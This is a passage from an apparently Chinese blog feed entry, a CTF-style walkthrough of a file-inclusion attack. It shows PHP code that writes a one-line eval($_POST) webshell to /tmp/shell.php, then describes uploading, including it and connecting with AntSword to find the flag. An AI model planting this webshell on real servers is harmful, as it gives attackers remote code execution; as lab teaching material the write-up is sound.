-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&#x27;123&#x27;</span>); </span><br><span class="line">    <span class="comment"># 123用于检查是否上传成功</span></span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/tmp/shell.php&#x27;</span>, <span class="string">&#x27;&lt;?php echo(&#x27;</span><span class="number">1234</span><span class="string">&#x27;); eval($_POST[0]);?&gt;&#x27;</span>);</span><br><span class="line">    <span class="comment"># 1234用于检查是否执行成功</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>注意，如果循环次数过多会导致电脑死机，所以不建议长时间循环，最好的方式是包含后就生成一个永久的shell，一包含到就可以结束自包含。</p>
-<p>打开上传表单：</p>
-<p><img src="https://s2.loli.net/2023/11/18/2CguitUDP35bB9s.png" alt="image-20231025193909257"></p>
-<p>上传成功后找到路径</p>
-<p><img src="https://s2.loli.net/2023/11/18/uSEZL1jxi2TqfCM.png" alt="image-20231025195150883"></p>
-<p>包含</p>
-<p><img src="https://s2.loli.net/2023/11/18/8hvtMaESITi7Jd4.png" alt="image-20231025195241303"></p>
-<p>输出123表示1.txt文件上传成功</p>
-<p>关闭循环，找到木马文件路径</p>
-<p><img src="https://s2.loli.net/2023/11/18/nUJworM2IdKe4Eu.png" alt="image-20231025195421339"></p>
-<p>输出1234表示一句话木马执行成功。接下来连蚁剑，找flag。</p>
-]]></content>
-      <categories>
-        <category>文件包含</category>
-      </categories>
-      <tags>
-        <tag>文件包含</tag>
       </tags>
   </entry>
   <entry>
